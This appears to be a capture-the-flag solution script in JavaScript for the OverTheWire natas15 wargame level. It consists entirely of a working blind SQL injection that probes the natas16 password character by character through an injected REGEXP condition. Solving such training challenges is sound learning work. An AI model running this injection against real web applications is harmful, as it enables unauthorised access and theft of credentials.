var str = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
for (var i = 0; i < 32; ++i){
	for (var j = 0; j < 62; ++j){
		var s = "...............................";
		$.post("http://natas15.natas.labs.overthewire.org/index.php?debug","username=natas16\" AND BINARY password REGEXP \"^"+s.slice(0, i)+str[j]+s.slice(i)+"$", function(h){
			var regex = /This user exists/i;
			if (h.match(regex) != null){
				console.log(h);
			}
			//else console.log(h);
		}, "html");
	}
}

